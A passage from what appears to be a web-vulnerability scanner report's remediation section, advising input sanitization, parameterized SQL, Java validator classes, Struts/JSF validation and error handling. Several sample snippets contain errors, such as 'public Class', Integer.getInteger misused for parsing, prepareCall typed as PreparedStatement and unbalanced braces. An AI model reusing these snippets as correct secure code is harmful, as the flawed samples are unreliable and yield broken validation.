              <br />
              <indentText>   [-] When possible, it is recommended to enforce a specific charset encoding (using 'Content-Type' header or &lt;meta&gt; tag).</indentText>
              <br />
              <text>HTTP response splitting:</text>
              <br />
              <text>Sanitize user input (at least, such input that is later embedded in HTTP responses).</text>
              <br />
              <text>Make sure that malicious characters are not part of the input, such as:</text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <br />
              <br />
              <text>Remote command execution:</text>
              <br />
              <text>Sanitize input to exclude symbols that are meaningful to the operating system's command execution, such as:</text>
              <br />
              <indentText>    [1] |  (pipe sign)</indentText>
              <indentText>    [2] &amp;  (ampersand sign)</indentText>
              <indentText>    [3] ;  (semicolon sign)</indentText>
              <indentText>   </indentText>
              <br />
              <text>Shell command execution:</text>
              <br />
              <text>A. Never pass unchecked user-input to Perl commands such as: eval(), open(), sysopen(), system().</text>
              <br />
              <text>B. Make sure malicious characters are not part of the input, such as:</text>
              <br />
              <indentText>    [1] $  (dollar sign)</indentText>
              <indentText>    [2] %  (percent sign)</indentText>
              <indentText>    [3] @  (at sign)</indentText>
              <br />
              <br />
              <text>XPath injection:</text>
              <br />
              <text>Sanitize input to exclude context changing symbols such as:</text>
              <br />
              <indentText>   [1] '  (single apostrophe)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   Etc.</indentText>
              <indentText>   </indentText>
              <br />
              <text>LDAP injection:</text>
              <br />
              <text>A. Use positive validation. Alphanumeric filtering (A..Z,a..z,0..9)  is suitable for most LDAP queries.</text>
              <br />
              <text>B. Special LDAP characters which should be filtered out or escaped:</text>
              <br />
              <indentText>   [1] A space or "#" character at the beginning of the string </indentText>
              <indentText>   [2] A space character at the end of the string </indentText>
              <indentText>   [3] ,   (comma sign)</indentText>
              <indentText>   [4] +   (plus sign)</indentText>
              <indentText>   [5] "   (quotation mark)</indentText>
              <indentText>   [6] \   (backslash)</indentText>
              <indentText>   [7] &lt;&gt;  (triangular parenthesis)</indentText>
              <indentText>   [8] ;   (semicolon sign)</indentText>
              <indentText>   [9] ()  (parenthesis)</indentText>
              <br />
              <br />
              <text>MX Injection: </text>
              <br />
              <text>Special MX characters should be filtered out: </text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <br />
              <text>Log Forging: </text>
              <br />
              <text>Special logging characters should be filtered out: </text>
              <br />
              <indentText>   [1] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [2] LF (Line feed, ASCII 0x0a)</indentText>
              <indentText>   [3] BS (Backspace, ASCII 0x08)</indentText>
              <br />
              <text>ORM Injection: </text>
              <br />
              <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input are valid and expected by the application.</text>
              <br />
              <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views.</text>
              <br />
              <text>C. Use a parameterized queries API</text>
              <br />
              <text>D. Sanitize input to exclude context-changing symbols such as (*):</text>
              <br />
              <indentText>   [1] ' (single apostrophe)</indentText>
              <indentText>   [2] " (quotation mark)</indentText>
              <indentText>   [3] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [4] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [5] ) (closing parenthesis)</indentText>
              <indentText>   [6] ; (semicolon)</indentText>
              <indentText> </indentText>
              <indentText>   (*) This applies to SQL. High level query languages may need a different sanitization mechanism.</indentText>
            </fixRecommendation>
            <fixRecommendation type="ASP.NET">
              <text>Here are two possible ways to protect your web application against SQL injection attacks:</text>
              <br />
              <br />
              <text>[1] Use a stored procedure rather than dynamically built SQL query string. The way parameters are passed to SQL Server stored procedures, prevents the use of apostrophes and hyphens.</text>
              <br />
              <br />
              <text>Here is a simple example of how to use stored procedures in ASP.NET:</text>
              <br />
              <br />
              <code>  ' Visual Basic example
  Dim DS As DataSet
  Dim MyConnection As SqlConnection
  Dim MyCommand As SqlDataAdapter
  Dim SelectCommand As String = "select * from users where username = @username"
  ...
  MyCommand.SelectCommand.Parameters.Add(New SqlParameter("@username", SqlDbType.NVarChar, 20))
  MyCommand.SelectCommand.Parameters("@username").Value = UserNameField.Value
  // C# example
  String selectCmd = "select * from Authors where state = @username";
  SqlConnection myConnection = new SqlConnection("server=...");
  SqlDataAdapter myCommand = new SqlDataAdapter(selectCmd, myConnection);
  myCommand.SelectCommand.Parameters.Add(new SqlParameter("@username", SqlDbType.NVarChar, 20));
  myCommand.SelectCommand.Parameters["@username"].Value = UserNameField.Value;
</code>
              <br />
              <br />
              <text>[2] You can add input validation to Web Forms pages by using validation controls. Validation controls provide an easy-to-use mechanism for all common types of standard validation - for example, testing for valid dates or values within a range - plus ways to provide custom-written validation. In addition, validation controls allow you to completely customize how error information is displayed to the user. Validation controls can be used with any controls that are processed in a Web Forms page's class file, including both HTML and Web server controls.</text>
              <br />
              <br />
              <text>In order to make sure user input contains only valid values, you can use one of the following validation controls:</text>
              <br />
              <br />
              <indentText> a. "RangeValidator": checks that a user's entry (value) is between specified lower and upper boundaries. You can check ranges within pairs of numbers, alphabetic characters, and dates.</indentText>
              <br />
              <indentText> b. "RegularExpressionValidator": checks that the entry matches a pattern defined by a regular expression. This type of validation allows you to check for predictable sequences of characters, such as those in social security numbers, e-mail addresses, telephone numbers, postal codes, and so on.</indentText>
              <br />
              <text>Important note: validation controls do not block user input or change the flow of page processing; they only set an error state, and produce error messages. It is the programmer's responsibility to test the state of the controls in the code before performing further application-specific actions.</text>
              <br />
              <br />
              <text>There are two ways to check for user input validity: </text>
              <br />
              <br />
              <text>1. Testing for a general error state: </text>
              <br />
              <br />
              <text>In your code, test the page's IsValid property. This property rolls up the values of the IsValid properties of all the validation controls on the page (using a logical AND). If one of the validation controls is set to invalid, the page's property will return false.</text>
              <br />
              <br />
              <text>2. Testing for the error state of individual controls:</text>
              <br />
              <br />
              <text>Loop through the page's Validators collection, which contains references to all the validation controls. You can then examine the IsValid property of each validation control.</text>
            </fixRecommendation>
            <fixRecommendation type="J2EE">
              <text>** Prepared Statements:</text>
              <br />
              <br />
              <text>There are 3 possible ways to protect your application against SQL injection, i.e. malicious tampering of SQL parameters.  Instead of dynamically building SQL statements, use:</text>
              <br />
              <br />
              <text>[1] PreparedStatement, which is precompiled and stored in a pool of PreparedStatement objects.  PreparedStatement defines setters to register input parameters that are compatible with the supported JDBC SQL data types.  For example, setString should be used for input parameters of type VARCHAR or LONGVARCHAR (refer to the Java API for further details).  This way of setting input parameters prevents an attacker from manipulating the SQL statement through injection of bad characters, such as apostrophe.</text>
              <br />
              <br />
              <text>Example of how to use a PreparedStatement in J2EE:</text>
              <br />
              <br />
              <code>  // J2EE PreparedStatemenet Example
  // Get a connection to the database
  Connection myConnection;
  if (isDataSourceEnabled()) {
      // using the DataSource to get a managed connection
      Context ctx = new InitialContext();
      myConnection = ((DataSource)ctx.lookup(datasourceName)).getConnection(dbUserName, dbPassword);
  } else {
      try {
          // using the DriverManager to get a JDBC connection
          Class.forName(jdbcDriverClassPath);
          myConnection = DriverManager.getConnection(jdbcURL, dbUserName, dbPassword);
      } catch (ClassNotFoundException e) {
          ...
      }
  }
  ...
  try {
      PreparedStatement myStatement = myConnection.prepareStatement("select * from users where username = ?");
      myStatement.setString(1, userNameField);
      ResultSet rs = myStatement.executeQuery();
      ...
      rs.close();
  } catch (SQLException sqlException) {
      ...
  } finally {
      myStatement.close();
      myConnection.close();
  }
</code>
              <br />
              <br />
              <text>[2] CallableStatement, which extends PreparedStatement to execute database SQL stored procedures.  This class inherits input setters from PreparedStatement (see [1] above).</text>
              <br />
              <br />
              <text>The following example assumes that this database stored procedure has been created:</text>
              <br />
              <br />
              <text>CREATE PROCEDURE select_user (@username varchar(20))</text>
              <br />
              <text>AS SELECT * FROM USERS WHERE USERNAME = @username;</text>
              <br />
              <br />
              <text>Example of how to use a CallableStatement in J2EE to execute the above stored procedure:</text>
              <br />
              <br />
              <code>  // J2EE PreparedStatemenet Example
  // Get a connection to the database
  Connection myConnection;
  if (isDataSourceEnabled()) {
      // using the DataSource to get a managed connection
      Context ctx = new InitialContext();
      myConnection = ((DataSource)ctx.lookup(datasourceName)).getConnection(dbUserName, dbPassword);
  } else {
      try {
          // using the DriverManager to get a JDBC connection
          Class.forName(jdbcDriverClassPath);
          myConnection = DriverManager.getConnection(jdbcURL, dbUserName, dbPassword);
      } catch (ClassNotFoundException e) {
          ...
      }
  }
  ...
  try {
      PreparedStatement myStatement = myConnection.prepareCall("{?= call select_user ?,?}");
      myStatement.setString(1, userNameField);
      myStatement.registerOutParameter(1, Types.VARCHAR);
      ResultSet rs = myStatement.executeQuery();
      ...
      rs.close();
  } catch (SQLException sqlException) {
      ...
  } finally {
      myStatement.close();
      myConnection.close();
  }
</code>
              <br />
              <br />
              <text>[3] Entity Bean, which represents an EJB business object in a persistent storage mechanism.  There are two types of entity beans: bean-managed and container-managed.  With bean-managed persistence, the developer is responsible of writing the SQL code to access the database (refer to sections [1] and [2] above).  With container-managed persistence, the EJB container automatically generates the SQL code.  As a result, the container is responsible of preventing malicious attempts to tamper with the generated SQL code.</text>
              <br />
              <br />
              <text>Example of how to use an Entity Bean in J2EE:</text>
              <br />
              <br />
              <code>  // J2EE EJB Example
  try {
      // lookup the User home interface
      UserHome userHome = (UserHome)context.lookup(User.class);    
      // find the User remote interface
      User = userHome.findByPrimaryKey(new UserKey(userNameField));    
      ...    
  } catch (Exception e) {
      ...
  }
</code>
              <br />
              <br />
              <text>RECOMMENDED JAVA TOOLS</text>
              <br />
              <text>N/A</text>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>
              </text>
              <link target="http://java.sun.com/j2se/1.4.1/docs/api/java/sql/PreparedStatement.html">http://java.sun.com/j2se/1.4.1/docs/api/java/sql/PreparedStatement.html</link>
              <br />
              <text>
              </text>
              <link target="http://java.sun.com/j2se/1.4.1/docs/api/java/sql/CallableStatement.html">http://java.sun.com/j2se/1.4.1/docs/api/java/sql/CallableStatement.html</link>
              <br />
              <br />
              <br />
              <text>** Input Data Validation:</text>
              <br />
              <br />
              <text>While data validations may be provided as a user convenience on the client-tier, data validation must be performed on the server-tier using Servlets.  Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text>
              <br />
              <br />
              <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text>
              <br />
              <text>[1] Required field</text>
              <br />
              <text>[2] Field data type (all HTTP request parameters are Strings by default)</text>
              <br />
              <text>[3] Field length</text>
              <br />
              <text>[4] Field range</text>
              <br />
              <text>[5] Field options</text>
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>[7] Cookie values</text>
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>A good practice is to implement the above routine as static methods in a "Validator" utility class.  The following sections describe an example validator class.</text>
              <br />
              <br />
              <text>[1] Required field</text>
              <br />
              <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces.  </text>
              <br />
              <br />
              <text>Example of how to validate required fields:</text>
              <br />
              <br />
              <code>  // Java example to validate required fields
  public Class Validator {
      ...
      public static boolean validateRequired(String value) {
          boolean isFieldValid = false;
          if (value != null &amp;&amp; value.trim().length() &gt; 0) {
              isFieldValid = true;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateRequired(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>[2] Field data type</text>
              <br />
              <text>In web applications, input parameters are poorly typed.  For example, all HTTP request parameters or cookie values are of type String.  The developer is responsible for verifying the input is of the correct data type.  Use the Java primitive wrapper classes to check if the field value can be safely converted to the desired primitive data type.</text>
              <br />
              <br />
              <text>Example of how to validate a numeric field (type int):</text>
              <br />
              <br />
              <code>  // Java example to validate that a field is an int number
  public Class Validator {
      ...
      public static boolean validateInt(String value) {
          boolean isFieldValid = false;
          try {
              Integer.parseInt(value);
              isFieldValid = true;
          } catch (Exception e) {
              isFieldValid = false;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  // check if the HTTP request parameter is of type int
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>A good practice is to convert all HTTP request parameters to their respective data types.  For example, the developer should store the "integerValue" of a request parameter in a request attribute and use it as shown in the following example:</text>
              <br />
              <br />
              <code>  // Example to convert the HTTP request parameter to a primitive wrapper data type
  // and store this value in a request attribute for further processing
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // convert fieldValue to an Integer
      Integer integerValue = Integer.getInteger(fieldValue);
      // store integerValue in a request attribute
      request.setAttribute("fieldName", integerValue);
  }
  ...
  // Use the request attribute for further processing
  Integer integerValue = (Integer)request.getAttribute("fieldName");
  ...
</code>
              <br />
              <br />
              <text>The primary Java data types that the application should handle:</text>
              <br />
              <text>- Byte</text>
              <br />
              <text>- Short</text>
              <br />
              <text>- Integer</text>
              <br />
              <text>- Long</text>
              <br />
              <text>- Float</text>
              <br />
              <text>- Double</text>
              <br />
              <text>- Date</text>
              <br />
              <br />
              <text>[3] Field length</text>
              <br />
              <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text>
              <br />
              <br />
              <text>Example to validate that the length of the userName field is between 8 and 20 characters:</text>
              <br />
              <br />
              <code>  // Example to validate the field length
  public Class Validator {
      ...
      public static boolean validateLength(String value, int minLength, int maxLength) {
          String validatedValue = value;
          if (!validateRequired(value)) {
              validatedValue = "";
          }
          return (validatedValue.length() &gt;= minLength &amp;&amp;
                      validatedValue.length() &lt;= maxLength);
      }
      ...
  }
  ...
  String userName = request.getParameter("userName");
  if (Validator.validateRequired(userName)) {
      if (Validator.validateLength(userName, 8, 20)) {
          // userName is valid, continue further processing
          ...
      }
  }
</code>
              <br />
              <br />
              <text>[4] Field range</text>
              <br />
              <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text>
              <br />
              <br />
              <text>Example to validate that the input numberOfChoices is between 10 and 20:</text>
              <br />
              <br />
              <code>  // Example to validate the field range
  public Class Validator {
      ...
      public static boolean validateRange(int value, int min, int max) {
          return (value &gt;= min &amp;&amp; value &lt;= max);
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("numberOfChoices");
  if (Validator.validateRequired(fieldValue)) {
      if (Validator.validateInt(fieldValue)) {
          int numberOfChoices = Integer.parseInt(fieldValue);
          if (Validator.validateRange(numberOfChoices, 10, 20)) {
              // numberOfChoices is valid, continue processing request
              ...
          }
      }
  }
</code>
              <br />
              <br />
              <text>[5] Field options</text>
              <br />
              <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options.  Remember that a malicious user can easily modify any option value.  Always validate the selected user value against the allowed options as defined by the functional requirements.</text>
              <br />
              <br />
              <text>Example to validate the user selection against a list of allowed options:</text>
              <br />
              <br />
              <code>  // Example to validate user selection against a list of options
  public Class Validator {
      ...
      public static boolean validateOption(Object[] options, Object value) {
          boolean isValidValue = false;
          try {
              List list = Arrays.asList(options);
              if (list != null) {
                  isValidValue = list.contains(value);
              }
          } catch (Exception e) {
          }
          return isValidValue;
      }
      ...
  }
  ...
  // Allowed options
  String[] options = {"option1", "option2", "option3");
  // Verify that the user selection is one of the allowed options
  String userSelection = request.getParameter("userSelection");
  if (Validator.validateOption(options, userSelection)) {
      // valid user selection, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>Always check that the user input matches a pattern as defined by the functionality requirements.  For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text>
              <br />
              <text>^[a-zA-Z0-9]*$</text>
              <br />
              <br />
              <text>Java 1.3 or earlier versions do not include any regular expression packages.  Apache Regular Expression Package (see Resources below) is recommended for use with Java 1.3 to resolve this lack of support.  Example to perform regular expression validation:</text>
              <br />
              <br />
              <code>  // Example to validate that a given value matches a specified pattern
  // using the Apache regular expression package
  import org.apache.regexp.RE;
  import org.apache.regexp.RESyntaxException;
  public Class Validator {
      ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
               RE r = new RE(expression);
               match = r.match(value);             
          }
          return match;
      }
      ...
  }
  ...
  // Verify that the userName request parameter is alpha-numeric
  String userName = request.getParameter("userName");
  if (Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      // userName is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>Java 1.4 introduced a new regular expression package (java.util.regex).  Here is a modified version of Validator.matchPattern using the new Java 1.4 regular expression package:</text>
              <br />
              <br />
              <code>  // Example to validate that a given value matches a specified pattern
  // using the Java 1.4 regular expression package
  import java.util.regex.Pattern;
  import java.util.regexe.Matcher;
  public Class Validator {
      ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
              match = Pattern.matches(expression, value);
          }
          return match;
      }
      ...
  }
</code>
              <br />
              <br />
              <text>[7] Cookie value</text>
              <br />
              <text>Use the javax.servlet.http.Cookie object to validate the cookie value.  The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text>
              <br />
              <br />
              <text>Example to validate a required cookie value:</text>
              <br />
              <br />
              <code>  // Example to validate a required cookie value
  // First retrieve all available cookies submitted in the HTTP request
  Cookie[] cookies = request.getCookies();
  if (cookies != null) {
      // find the "user" cookie
      for (int i=0; i&lt;cookies.length; ++i) {
          if (cookies[i].getName().equals("user")) {
              // validate the cookie value
              if (Validator.validateRequired(cookies[i].getValue()) {
                  // valid cookie value, continue processing request
                  ...
              }
          }    
      }
  }
</code>
              <br />
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <text>[8-1] Filter user input</text>
              <br />
              <text>To guard the application against cross-site scripting, sanitize HTML by converting sensitive characters to their corresponding character entities.  These are the HTML sensitive characters:</text>
              <br />
              <text>&lt; &gt; " ' % ; ) ( &amp; +</text>
              <br />
              <br />
              <text>Example to filter a specified string by converting sensitive characters to their corresponding character entities:</text>
              <br />
              <br />
              <code>  // Example to filter sensitive data to prevent cross-site scripting
  public Class Validator {
      ...
      public static String filter(String value) {
          if (value == null) {
              return null;
          }        
          StringBuffer result = new StringBuffer(value.length());
          for (int i=0; i&lt;value.length(); ++i) {
              switch (value.charAt(i)) {
              case '&lt;':
                  result.append("&amp;lt;");
                  break;
              case '&gt;': 
                  result.append("&amp;gt;");
                  break;
              case '"': 
                  result.append("&amp;quot;");
                  break;
              case '\'': 
                  result.append("&amp;#39;");
                  break;
              case '%': 
                  result.append("&amp;#37;");
                  break;
              case ';': 
                  result.append("&amp;#59;");
                  break;
              case '(': 
                  result.append("&amp;#40;");
                  break;
              case ')': 
                  result.append("&amp;#41;");
                  break;
              case '&amp;': 
                  result.append("&amp;amp;");
                  break;
              case '+':
                  result.append("&amp;#43;");
                  break;
              default:
                  result.append(value.charAt(i));
                  break;
          }        
          return result;
      }
      ...
  }
  ...
  // Filter the HTTP response using Validator.filter
  PrintWriter out = response.getWriter();
  // set output response
  out.write(Validator.filter(response));
  out.close();
</code>
              <br />
              <br />
              <text>The Java Servlet API 2.3 introduced Filters, which supports the interception and transformation of HTTP requests or responses.</text>
              <br />
              <br />
              <text>Example of using a Servlet Filter to sanitize the response using Validator.filter:</text>
              <br />
              <br />
              <code>  // Example to filter all sensitive characters in the HTTP response using a Java Filter.
  // This example is for illustration purposes since it will filter all content in the response, including HTML tags!
  public class SensitiveCharsFilter implements Filter {
      ...
      public void doFilter(ServletRequest request,
                      ServletResponse response,
                      FilterChain chain)
              throws IOException, ServletException {
          PrintWriter out = response.getWriter();
          ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response);
          chain.doFilter(request, wrapper);
          CharArrayWriter caw = new CharArrayWriter();
          caw.write(Validator.filter(wrapper.toString()));
          
          response.setContentType("text/html");
          response.setContentLength(caw.toString().length());
          out.write(caw.toString());
          out.close();
      }
      ...
      public class CharResponseWrapper extends HttpServletResponseWrapper {
          private CharArrayWriter output;
          public String toString() {
              return output.toString();
          }
      
          public CharResponseWrapper(HttpServletResponse response){
              super(response);
              output = new CharArrayWriter();
          }
          
          public PrintWriter getWriter(){
              return new PrintWriter(output);
          }
      }
  } 
  }
</code>
              <br />
              <br />
              <text>[8-2] Secure the cookie</text>
              <br />
              <text>When storing sensitive data in a cookie, make sure to set the secure flag of the cookie in the HTTP response, using Cookie.setSecure(boolean flag) to instruct the browser to send the cookie  using  a secure protocol, such as HTTPS or SSL.</text>
              <br />
              <br />
              <text>Example to secure the "user" cookie:</text>
              <br />
              <br />
              <code>  // Example to secure a cookie, i.e. instruct the browser to
  // send the cookie using a secure protocol
  Cookie cookie = new Cookie("user", "sensitive");
  cookie.setSecure(true);
  response.addCookie(cookie);
</code>
              <br />
              <br />
              <text>RECOMMENDED JAVA TOOLS</text>
              <br />
              <text>The two main Java frameworks for server-side validation are:</text>
              <br />
              <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text>
              <br />
              <text>The Jakarta Commons Validator is a powerful framework that implements all the above data validation requirements.  These rules are configured in an XML file that defines input validation rules for form fields.  Struts supports output filtering of dangerous characters in the [8] HTTP Response by default on all data written using the Struts 'bean:write' tag.  This filtering may be disabled by setting the 'filter=false' flag.</text>
              <br />
              <br />
              <text>Struts defines the following basic input validators, but custom validators may also be defined:</text>
              <br />
              <text>required: succeeds if the field contains any characters other than whitespace.</text>
              <br />
              <text>mask: succeeds if the value matches the regular expression given by the mask attribute.</text>
              <br />
              <text>range: succeeds if the value is within the values given by the min and max attributes ((value &gt;= min) &amp; (value &lt;= max)).</text>
              <br />
              <text>maxLength: succeeds if the field is length is less than or equal to the max attribute.</text>
              <br />
              <text>minLength: succeeds if the field is length is greater than or equal to the min attribute.</text>
              <br />
              <text>byte, short, integer, long, float, double: succeeds if the value can be converted to the corresponding primitive.</text>
              <br />
              <text>date: succeeds if the value represents a valid date. A date pattern may be provided.</text>
              <br />
              <text>creditCard: succeeds if the value could be a valid credit card number.</text>
              <br />
              <text>email: succeeds if the value could be a valid e-mail address.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using Struts Validator:</text>
              <br />
              <code>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</code>
              <br />
              <br />
              <text>[2] JavaServer Faces Technology</text>
              <br />
              <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events and input validation.</text>
              <br />
              <br />
              <text>The JavaServer Faces API implements the following basic validators, but custom validators may be defined:</text>
              <br />
              <text>validate_doublerange: registers a DoubleRangeValidator on a component</text>
              <br />
              <text>validate_length: registers a LengthValidator on a component</text>
              <br />
              <text>validate_longrange: registers a LongRangeValidator on a component</text>
              <br />
              <text>validate_required: registers a RequiredValidator on a component</text>
              <br />
              <text>validate_stringrange: registers a StringRangeValidator on a component</text>
              <br />
              <text>validator: registers a custom Validator on a component</text>
              <br />
              <br />
              <text>The JavaServer Faces API defines the following UIInput and UIOutput Renderers (Tags):</text>
              <br />
              <text>input_date: accepts a java.util.Date formatted with a java.text.Date instance</text>
              <br />
              <text>output_date: displays a java.util.Date formatted with a java.text.Date instance</text>
              <br />
              <text>input_datetime: accepts a java.util.Date formatted with a java.text.DateTime instance</text>
              <br />
              <text>output_datetime: displays a java.util.Date formatted with a java.text.DateTime instance</text>
              <br />
              <text>input_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text>
              <br />
              <text>output_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text>
              <br />
              <text>input_text: accepts a text string of one line.</text>
              <br />
              <text>output_text: displays a text string of one line.</text>
              <br />
              <text>input_time: accepts a java.util.Date, formatted with a java.text.DateFormat time instance</text>
              <br />
              <text>output_time: displays a java.util.Date, formatted with a java.text.DateFormat time instance</text>
              <br />
              <text>input_hidden: allows a page author to include a hidden variable in a page</text>
              <br />
              <text>input_secret: accepts one line of text with no spaces and displays it as a set of asterisks as it is typed</text>
              <br />
              <text>input_textarea: accepts multiple lines of text</text>
              <br />
              <text>output_errors: displays error messages for an entire page or error messages associated with a specified client identifier</text>
              <br />
              <text>output_label: displays a nested component as a label for a specified input field</text>
              <br />
              <text>output_message: displays a localized message</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text>
              <br />
              <code>  &lt;%@ taglib uri="http://java.sun.com/jsf/html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://java.sun.com/jsf/core" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</code>
              <br />
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>Java API 1.3 - </text>
              <link target="http://java.sun.com/j2se/1.3/docs/api/">http://java.sun.com/j2se/1.3/docs/api/</link>
              <br />
              <text>Java API 1.4 - </text>
              <link target="http://java.sun.com/j2se/1.4/docs/api/">http://java.sun.com/j2se/1.4/docs/api/</link>
              <br />
              <text>Java Servlet API 2.3 - </text>
              <link target="http://java.sun.com/products/servlet/2.3/javadoc/">http://java.sun.com/products/servlet/2.3/javadoc/</link>
              <br />
              <text>Java Regular Expression Package - </text>
              <link target="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</link>
              <br />
              <text>Jakarta Validator - </text>
              <link target="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</link>
              <br />
              <text>JavaServer Faces Technology - </text>
              <link target="http://java.sun.com/j2ee/javaserverfaces/">http://java.sun.com/j2ee/javaserverfaces/</link>
              <br />
              <br />
              <text>** Error Handling:</text>
              <br />
              <br />
              <text>Many J2EE web application architectures follow the Model View Controller (MVC) pattern.  In this pattern a Servlet acts as a Controller.  A Servlet delegates the application processing to a JavaBean such as an EJB Session Bean (the Model).  The Servlet then forwards the request to a JSP (View) to render the processing results.  Servlets should check all input, output, return codes, error codes and known exceptions to ensure that the expected processing actually occurred.</text>
              <br />
              <br />
              <text>While data validation protects applications against malicious data tampering, a sound error handling strategy is necessary to prevent the application from inadvertently disclosing internal error messages such as exception stack traces.  A good error handling strategy addresses the following items:</text>
              <br />
              <br />
              <text>[1] Defining Errors</text>
              <br />
              <text>[2] Reporting Errors</text>
              <br />
              <text>[3] Rendering Errors</text>
              <br />
              <text>[4] Error Mapping</text>
              <br />
              <br />
              <text>[1] Defining Errors</text>
              <br />
              <text>Hard-coded error messages in the application layer (e.g. Servlets) should be avoided.  Instead, the application should use error keys that map to known application failures.  A good practice is to define error keys that map to validation rules for HTML form fields or other bean properties.  For example, if the "user_name" field is required, is alphanumeric, and must be unique in the database, then the following error keys should be defined:</text>
              <br />
              <br />
              <text>(a) ERROR_USERNAME_REQUIRED: this error key is used to display a message notifying the user that the "user_name" field is required;</text>
              <br />
              <text>(b) ERROR_USERNAME_ALPHANUMERIC: this error key is used to display a message notifying the user that the "user_name" field should be alphanumeric;</text>
              <br />
              <text>(c) ERROR_USERNAME_DUPLICATE: this error key is used to display a message notifying the user that the "user_name" value is a duplicate in the database;</text>
              <br />
              <text>(d) ERROR_USERNAME_INVALID: this error key is used to display a generic message notifying the user that the "user_name" value is invalid;</text>
              <br />
              <br />
              <text>A good practice is to define the following framework Java classes which are used to store and report application errors:</text>
              <br />
              <br />
              <text>- ErrorKeys: defines all error keys</text>
              <br />
              <br />
              <code>      // Example: ErrorKeys defining the following error keys:    
      //    - ERROR_USERNAME_REQUIRED
      //    - ERROR_USERNAME_ALPHANUMERIC
      //    - ERROR_USERNAME_DUPLICATE
      //    - ERROR_USERNAME_INVALID
      //    ...
      public Class ErrorKeys {
          public static final String ERROR_USERNAME_REQUIRED = "error.username.required";
          public static final String ERROR_USERNAME_ALPHANUMERIC = "error.username.alphanumeric";
          public static final String ERROR_USERNAME_DUPLICATE = "error.username.duplicate";
          public static final String ERROR_USERNAME_INVALID = "error.username.invalid";
          ...
      }
</code>
              <br />
              <indentText>    </indentText>
              <text>- Error: encapsulates an individual error</text>
              <br />
              <br />
              <code>      // Example: Error encapsulates an error key.
